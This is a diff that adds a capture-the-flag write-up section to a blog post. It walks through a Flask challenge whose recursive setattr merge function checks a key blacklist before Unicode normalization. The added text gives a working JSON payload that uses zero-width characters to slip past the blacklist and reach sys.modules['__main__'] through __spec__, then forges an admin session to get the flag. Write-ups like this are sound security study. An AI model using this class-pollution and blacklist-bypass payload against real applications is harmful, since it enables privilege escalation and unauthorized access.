@@ -518,6 +518,204 @@ _Found Flag_
 
 And i got the flag :D
 
+### Now Session
+![img-description](https://i.ibb.co/LhXVTm7B/image-2026-02-05-131356758.png)
+_Website_
+
+When I first accessed the website, I didn't find anything interesting, so I immediately analyzed the source code.
+
+In ```app.py```:
+```python
+@app.route("/save_build", methods=["POST"])
+    def save_build():
+        if not request.is_json:
+            return Response("Only Accept Type JSON", status=400)
+        try:
+            exploit.save(request.data)
+        except Exception:
+            return Response("Bad Build", status=400)
+        return Response("Build Saved", status=200)
+```
+
+This is where we'll attack, because it receives user input as ```raw JSON```.
+
+```python
+class Exploit:
+    def __getattr__(self, name):
+        if name == "__spec__":
+            return flask.__spec__
+        raise AttributeError(name)
+    def __dir__(self):
+        base = super().__dir__()
+        return [x for x in base if x != "__spec__"]
+
+    current_content = []
+    @property
+    def pinned_content(self):
+        return [{
+            "title": "Pinned Content",
+            "text": (
+                "The Path is super logic, and the crumbs are gone. "
+                "Wide crumbs and invisible crumbs still stick to your shoes."
+            )
+        }]
+
+    def save(self, data: bytes):
+        data_ = json.loads(data)
+        if "new_content" not in data_:
+            raise Exception("There is nothing to save.")
+        set_(data_, self)
+
+    def load(self):
+        response = list(self.pinned_content)
+        if hasattr(self, "new_content") and self.new_content:
+            self.current_content.extend(self.new_content)
+            self.new_content = None
+        response.extend(self.current_content)
+        return response[::-1]
+```
+
+The ```exploit.save``` function calls the ```set_``` function, which is a dangerous processing function.
+
+```python
+def set_(src, dest, *, _depth=0, _budget=[0]):
+    if _depth > 14:
+        return
+    _budget[0] += 1
+    if _budget[0] > 5000:
+        return
+    blacklist_raw = [
+        "__", "globals", "init", "spec", "loader",
+        "sys", "modules", "main", "application",
+        "secret", "config", "builtins",
+        "__class__", "__dict__", "__subclasses__", "__public__",
+    ]
+    for raw_k, v in (src or {}).items():
+        if not isinstance(raw_k, str):
+            continue
+        lk = raw_k.lower()
+        if any(b in lk for b in blacklist_raw):
+            continue
+        k = _norm_key(raw_k)
+        if isinstance(dest, MutableMapping) or hasattr(dest, "__setitem__"):
+            cur = None
+            try:
+                if hasattr(dest, "get"):
+                    cur = dest.get(k)
+                else:
+                    cur = dest[k]
+            except Exception:
+                cur = None
+            if isinstance(v, dict) and cur is not None:
+                set_(v, cur, _depth=_depth + 1, _budget=_budget)
+            else:
+                try:
+                    dest[k] = v
+                except Exception:
+                    pass
+            continue
+        if isinstance(v, dict) and hasattr(dest, k):
+            try:
+                cur = getattr(dest, k)
+                set_(v, cur, _depth=_depth + 1, _budget=_budget)
+            except Exception:
+                pass
+        else:
+            try:
+                setattr(dest, k, v)
+            except Exception:
+                pass
+```
+
+The user controls the property name ```(k)``` and the code uses ```setattr()``` to set it directly on the object ⇒ this is ```mass assignment / object pollution```.
+
+The code has a ```blacklist```, but it blacklists first and normalizes later ⇒ creating a bypass.
+
+```normalize(raw_k)``` does two things:
+
+- NFKC normalize: confusable characters can be converted into true ASCII characters.
+Example: ＿ (fullwidth underscore) → _
+
+- Remove zero-width: removes invisible characters like ```\u200b```
+
+And this is the route we need to get the flag:
+```python
+@app.route("/get_flag")
+    def flag():
+        if session.get("user") != "admin":
+            return render_template(
+                "template.html",
+                status=403,
+                message="Forbidden: You are not authorized to access this resource."
+            ), 403
+        return render_template(
+            "template.html",
+            status=200,
+            message=os.getenv("FLAG", "VSL{fake_flag}")
+        )
+    return app
+```
+
+But i need to become ```admin``` but how???
+Luckily, i can become ```admin``` thanks to the ```object pollution``` vulnerability mentioned above.
+
+Below is the payload, i will post it to ```/save_build``` to obtain the admin session.
+```json
+{
+    "_\u200b_sp\u200bec_\u200b_": {
+      "lo\u200bader": {
+        "exec\u200b_module": {
+          "_\u200b_glo\u200bbals_\u200b_": {
+            "s\u200bys": {
+              "mo\u200bdules": {
+                "_\u200b_ma\u200bin_\u200b_": {
+                  "session": { "user": "admin" }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "new_content": []
+  }
+```
+which is:
+```json
+{
+  "__spec__": {
+    "loader": {
+      "exec_module": {
+        "__globals__": {
+          "sys": {
+            "modules": {
+              "__main__": {
+                "session": { "user": "admin" }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "new_content": []
+}
+```
+or:
+```python
+exploit.__spec__.loader.exec_module.__globals__["sys"].modules["__main__"].session = {"user":"admin"}
+```
+
+![img-description](https://i.ibb.co/SX9FmRtT/image-2026-02-05-133928735.png)
+_Obtain the admin session cookie_
+
+Then, when you send a get request to /get_flag with the session cookie, you will get the flag.
+
+![img-description](https://i.ibb.co/0j0J8MsM/image-2026-02-05-134335754.png)
+_Got the flag_
+
+I ran this CTF locally, so "fake flag" lol.
+
 ### PyRunner2
 I solved this chall by using this script:
 ```python
@@ -697,5 +895,4 @@ VSL CTF is very fun tho lol, and all the challs are sick, pretty new to me haha.
 
 ### End
 Well, that's all for my writeup =))) Have a great day everyone, I'm going to sleep now.
-
 
